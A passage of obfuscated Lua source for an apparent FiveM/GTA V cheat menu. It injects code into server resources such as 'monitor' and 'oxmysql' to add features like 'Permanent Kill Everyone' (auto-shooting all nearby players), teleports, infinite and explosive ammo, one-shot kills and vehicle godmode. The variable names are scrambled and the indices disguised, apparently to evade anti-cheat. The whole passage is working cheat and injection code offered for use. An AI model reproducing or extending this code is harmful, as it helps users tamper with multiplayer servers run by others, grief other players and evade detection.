                local nBxMzLqPw = CreateThread
                local qWeRtYuiOp = ShootSingleBulletBetweenCoords

                nBxMzLqPw(function()
                    while aSwDeFgHiJkLoPx and not Unloaded do
                        Wait(gBvTnCuXe)
                        local bNmZxSwEd = GetActivePlayers()
                        local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                        for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                            local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                            if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                                local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                                if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                    local xScVbNmAz = vector3(
                                        eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.z + 1.2
                                    )

                                    local dFgHjKlZx = vector3(
                                        eDxCfVgBh.x,
                                        eDxCfVgBh.y,
                                        eDxCfVgBh.z + 0.2
                                    )

                                    qWeRtYuiOp(
                                        xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                        dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                        aSdFgHjKl,
                                        true,
                                        rVtNiUcEx,
                                        mAxPlErOy,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            pLoMkIjUhbGyTf()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aSwDeFgHiJkLoPx = false
        ]]);end);MachoMenuCheckbox(v40[1798 -(503 + 1293) ],"Permanent Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
            qWeRtYuIoPlMnAb = true

            local function bZxLmNcVqPeTyUi()
                local vBnMkLoPi = PlayerPedId()
                local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
                local eDxCfVgBh = 100
                local lKjHgFdSa = 1000.0
                local mAxPlErOy = 300.0

                local rTwEcVzUi = CreateThread
                local oPiLyKuJm = ShootSingleBulletBetweenCoords

                rTwEcVzUi(function()
                    while qWeRtYuIoPlMnAb and not Unloaded do
                        Wait(eDxCfVgBh)
                        local aSdFgHjKl = GetActivePlayers()
                        local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                        for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                            local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                            if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                                local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                                if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                    local jUiKoLpMq = vector3(
                                        zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.z + 1.2
                                    )

                                    local cReAtEtHrEaD = vector3(
                                        zAsXcVbNm.x,
                                        zAsXcVbNm.y,
                                        zAsXcVbNm.z + 0.2
                                    )

                                    oPiLyKuJm(
                                        jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                        cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                        lKjHgFdSa,
                                        true,
                                        wQaSzXedC,
                                        vBnMkLoPi,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            bZxLmNcVqPeTyUi()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            qWeRtYuIoPlMnAb = false
        ]]);end);local v52=MachoMenuInputbox(v41[1],"Coords:","x, y, z");MachoMenuButton(v41[2 -1 ],"Teleport to Coords",function() local v202=MachoMenuGetInputbox(v52);if (v202 and (v202~="")) then local v290=0 + 0 ;local v291;local v292;local v293;while true do if (v290==1) then v292=tonumber(v292);v293=tonumber(v293);v290=1063 -(810 + 251) ;end if (v290==0) then v291,v292,v293=v202:match("([^,]+),%s*([^,]+),%s*([^,]+)");v291=tonumber(v291);v290=1;end if (v290==2) then if (v291 and v292 and v293) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                    local function b0NtdqLZKW()
                        local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                        local nHgFdSaZxCvBnMq = PlayerPedId
                        local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                        local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                        local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                        local x, y, z = %f, %f, %f
                        local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                        if found then z = gZ + 1.0 end

                        local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                        uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                    end

                    b0NtdqLZKW()
                ]],v291,v292,v293));end break;end end end end);MachoMenuButton(v41[1 + 0 ],"Waypoint",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function xQX7uzMNfb()
                local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
                local zXcVbNmQwErTyUi = DoesBlipExist
                local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
                local lKjHgFdSaPlMnBv = PlayerPedId
                local qWeRtYuIoPlMnBv = SetEntityCoords

                local function XcVrTyUiOpAsDfGh()
                    local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                    if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                    return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
                end

                local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
                if GhTyUoLpZmNbVcXq then
                    local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                    qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
                end
            end

            xQX7uzMNfb()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"FIB Building",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function HAZ6YqLRbM()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 140.43, -750.52, 258.15
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            HAZ6YqLRbM()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Mission Row PD",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oypB9FcNwK()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 425.1, -979.5, 30.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oypB9FcNwK()
        ]]);end);MachoMenuButton(v41[534 -(43 + 490) ],"Pillbox Hospital",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TmXU0zLa4e()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 308.6, -595.3, 43.28
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            TmXU0zLa4e()
        ]]);end);MachoMenuButton(v41[1],"Del Perro Pier",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function eLQN9XKwbJ()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1632.87, -1007.81, 13.07
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            eLQN9XKwbJ()
        ]]);end);MachoMenuButton(v41[1],"Grove Street",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function YrAFvPMkqt()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 109.63, -1943.14, 20.80
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            YrAFvPMkqt()
        ]]);end);MachoMenuButton(v41[734 -(711 + 22) ],"Legion Square",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zdVCXL8rjp()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 229.21, -871.61, 30.49
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            zdVCXL8rjp()
        ]]);end);MachoMenuButton(v41[1],"LS Customs",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oKXpQUYwd5()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -365.4, -131.8, 37.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oKXpQUYwd5()
        ]]);end);MachoMenuButton(v41[3 -2 ],"Maze Bank",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function E1tYUMowqF()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -75.24, -818.95, 326.1
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            E1tYUMowqF()
        ]]);end);MachoMenuButton(v41[860 -(240 + 619) ],"Mirror Park",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Ptn2qMBvYe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1039.2, -765.3, 57.9
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            Ptn2qMBvYe()
        ]]);end);MachoMenuButton(v41[1],"Vespucci Beach",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function gQZf7xYULe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1223.8, -1516.6, 4.4
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            gQZf7xYULe()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Vinewood",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function JqXLKbvR20()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 293.2, 180.5, 104.3
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            JqXLKbvR20()
        ]]);end);MachoMenuButton(v41[1],"Sandy Shores",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NxvTpL3qWz()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1843.10, 3707.60, 33.52
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            NxvTpL3qWz()
        ]]);end);MachoMenuButton(v41[2],"Print Current Coords",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Xy9TqLzVmN()
                local zXcVbNmQwErTyUi = GetEntityCoords
                local aSdFgHjKlQwErTy = PlayerPedId

                local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
                local x, y, z = coords.x, coords.y, coords.z
                print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
            end

            Xy9TqLzVmN()
        ]]);end);MachoMenuCheckbox(v42[1 -0 ],"Infinite Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
            LkJgFdSaQwErTy = true

            local function qUwKZopRM8()
                if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                LkJgFdSaQwErTy = true

                local MnBvCxZlKjHgFd = CreateThread
                MnBvCxZlKjHgFd(function()
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                    local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                    local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                    local GhJkLzXcVbNmQw = SetPedAmmo

                    while LkJgFdSaQwErTy and not Unloaded do
                        local ped = AsDfGhJkLzXcVb()
                        local weapon = ZxCvBnMqWeRtYu(ped)

                        QwErTyUiOpAsDf(ped, true)

                        if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                            GhJkLzXcVbNmQw(ped, weapon, 250)
                        end

                        Wait(0)
                    end
                end)
            end

            qUwKZopRM8()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LkJgFdSaQwErTy = false

            local function yFBN9pqXcL()
                local AsDfGhJkLzXcVb = PlayerPedId
                local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
            end

            yFBN9pqXcL()
        ]]);end);MachoMenuCheckbox(v42[1 + 0 ],"Explosive Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
            QzWxEdCvTrBnYu = true

            local function WpjLRqtm28()
                if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                QzWxEdCvTrBnYu = true

                local UyJhNbGtFrVbCx = CreateThread
                UyJhNbGtFrVbCx(function()
                    local HnBvFrTgYhUzKl = PlayerPedId
                    local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                    local JkLpHgTfCvXzQa = AddOwnedExplosion

                    while QzWxEdCvTrBnYu and not Unloaded do
                        local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                        local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                        if XsWaQzEdCvTrBn then
                            JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            WpjLRqtm28()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QzWxEdCvTrBnYu = false
        ]]);end);MachoMenuCheckbox(v42[1],"Oneshot Kill",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
            RfGtHyUjMiKoLp = true

            local function xUQp7AK0tv()
                local PlMnBvCxZaSdFg = CreateThread
                PlMnBvCxZaSdFg(function()
                    local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                    local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                    local ErTyUiOpAsDfGh = PlayerPedId

                    while RfGtHyUjMiKoLp do
                        if Unloaded then
                            RfGtHyUjMiKoLp = false
                            break
                        end

                        local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                        if Wp and Wp ~= 0 then
                            AsDfGhJkLzXcVb(Wp, 1000.0)
                        end

                        Wait(0)
                    end
                end)
            end

            xUQp7AK0tv()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            RfGtHyUjMiKoLp = false
            local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
            local AsDfGhJkLzXcVb = SetWeaponDamageModifier
            local ErTyUiOpAsDfGh = PlayerPedId
            local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
            if Wp and Wp ~= 0 then
                AsDfGhJkLzXcVb(Wp, 1.0)
            end
        ]]);end);local v53=MachoMenuInputbox(v42[2],"Weapon:","...");MachoMenuButton(v42[1746 -(1344 + 400) ],"Spawn Weapon",function() local v203=MachoMenuGetInputbox(WeaponSpawnerBox);if (v203 and (v203~="")) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                local function GiveWeapon()
                    local ped = PlayerPedId()
                    local weapon = GetHashKey("%s")
                    local XeCwVrBtNuMyLk = GiveWeaponToPed
                    XeCwVrBtNuMyLk(ped, weapon, 250, true, true)
                end

                GiveWeapon()
            ]],v203));end end);local v54=0;local v55={[0]={name="Default",hash="MP_F_Freemode"},[1]={name="Gangster",hash="Gang1H"},[2]={name="Wild",hash="GangFemale"},[408 -(255 + 150) ]={name="Red Neck",hash="Hillbilly"}};MachoMenuDropDown(v42[3 + 0 ],"Aiming Style",function(v204) v54=v204;end,"Default","Gangster","Wild","Red Neck");MachoMenuButton(v42[3],"Apply Aiming Style",function() local v205=v55[v54];if  not v205 then return;end MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
            local function vXK2dPLR07()
                local UiOpAsDfGhJkLz = PlayerPedId
                local PlMnBvCxZaSdFg = GetHashKey
                local QwErTyUiOpAsDf = SetWeaponAnimationOverride

                local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
                QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
            end

            vXK2dPLR07()

        ]]):format(v205.hash));end);MachoMenuCheckbox(v43[1 + 0 ],"Vehicle Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function LWyZoXRbqK()
                local LkJhGfDsAzXcVb = CreateThread
                LkJhGfDsAzXcVb(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                        local TyUiOpAsDfGhJkL = PlayerPedId
                        local AsDfGhJkLzXcVbN = SetEntityInvincible

                        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                        if vehicle and vehicle ~= 0 then
                            AsDfGhJkLzXcVbN(vehicle, true)
                        end
                        Wait(0)
                    end
                end)
            end

            LWyZoXRbqK()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local TyUiOpAsDfGhJkL = PlayerPedId
            local AsDfGhJkLzXcVbN = SetEntityInvincible

            local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
            if vehicle and vehicle ~= 0 then
                AsDfGhJkLzXcVbN(vehicle, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1],"Force Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
            GhYtReFdCxWaQzLp = true

            local function OpAsDfGhJkLzXcVb()
                local lMnbVcXzZaSdFg = CreateThread
                lMnbVcXzZaSdFg(function()
                    local QwErTyUiOp         = _G.PlayerPedId
                    local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                    local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                    local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                    local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                    local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                    local En_g_Health_Get    = _G.GetVehicleEngineHealth
                    local En_g_Health_Set    = _G.SetVehicleEngineHealth
                    local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                    local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                    local function _tick(vh)
                        if vh and vh ~= 0 then
                            No_Hotwire_Set(vh, false)
                            En_g_Degrade_Set(vh, false)
                            ErTyUiOpAsDfGh(vh, false)
                            KeEpOnAb(vh, true)

                            local eh = En_g_Health_Get(vh)
                            if (not eh) or eh < 300.0 then
                                En_g_Health_Set(vh, 900.0)
                            end

                            ZxCvBnMqWeRtYu(vh, true, true, true)
                        end
                    end

                    while GhYtReFdCxWaQzLp and not Unloaded do
                        local p  = QwErTyUiOp()

                        _tick(AsDfGhJkLz(p, false))
                        _tick(TyUiOpAsDfGh(p))
                        _tick(AsDfGhJkLz(p, true))

                        Wait(0)
                    end
                end)
            end

            OpAsDfGhJkLzXcVb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GhYtReFdCxWaQzLp = false
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            if v and v ~= 0 then
                SetVehicleKeepEngineOnWhenAbandoned(v, false)
                SetVehicleEngineCanDegrade(v, true)
                SetVehicleUndriveable(v, false)
            end
        ]]);end);MachoMenuCheckbox(v43[4 -3 ],"Vehicle Auto Repair",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
            PlAsQwErTyUiOp = true

            local function uPkqLXTm98()
                local QwErTyUiOpAsDf = CreateThread
                QwErTyUiOpAsDf(function()
                    while PlAsQwErTyUiOp and not Unloaded do
                        local AsDfGhJkLzXcVb = PlayerPedId
                        local LzXcVbNmQwErTy = GetVehiclePedIsIn
                        local VbNmLkJhGfDsAz = SetVehicleFixed
                        local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                        local ped = AsDfGhJkLzXcVb()
                        local vehicle = LzXcVbNmQwErTy(ped, false)
                        if vehicle and vehicle ~= 0 then
                            VbNmLkJhGfDsAz(vehicle)
                            MnBvCxZaSdFgHj(vehicle, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            uPkqLXTm98()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            PlAsQwErTyUiOp = false
        ]]);end);MachoMenuCheckbox(v43[1],"Freeze Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
            LzKxWcVbNmQwErTy = true

            local function WkQ79ZyLpT()
                local tYhGtFrDeSwQaZx = CreateThread
                local xCvBnMqWeRtYuIo = PlayerPedId
                local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
                local gKdNqLpYxMiV = FreezeEntityPosition
                local jBtWxFhPoZuR = Wait

                tYhGtFrDeSwQaZx(function()
                    while LzKxWcVbNmQwErTy and not Unloaded do
                        local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                        local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                        if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                            gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                        end
                        jBtWxFhPoZuR(0)
                    end
                end)
            end

            WkQ79ZyLpT()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LzKxWcVbNmQwErTy = false

            local function i7qWlBXtPo()
                local yUiOpAsDfGhJkLz = PlayerPedId
                local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                local FdSaPlMnBvCxZlK = FreezeEntityPosition

                local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
                local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
                if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                    FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
                end
            end

            i7qWlBXtPo()
        ]]);end);MachoMenuCheckbox(v43[3 -2 ],"Vehicle Hop",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
            NuRqVxEyKiOlZm = true

            local function qPTnXLZKyb()
                local ZlXoKmVcJdBeTr = CreateThread
                ZlXoKmVcJdBeTr(function()
                    while NuRqVxEyKiOlZm and not Unloaded do
                        local GvHnMzLoPqAxEs = PlayerPedId
                        local DwZaQsXcErDfGt = GetVehiclePedIsIn
                        local BtNhUrLsEkJmWq = IsDisabledControlPressed
                        local PlZoXvNyMcKwQi = ApplyForceToEntity

                        local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                        local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                        if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                            PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                        end

                        Wait(0)
                    end
                end)
            end

            qPTnXLZKyb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NuRqVxEyKiOlZm = false
        ]]);end);MachoMenuCheckbox(v43[1740 -(404 + 1335) ],"Rainbow Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
            GxRpVuNzYiTq = true

            local function jqX7TvYzWq()
                local WvBnMpLsQzTx = GetGameTimer
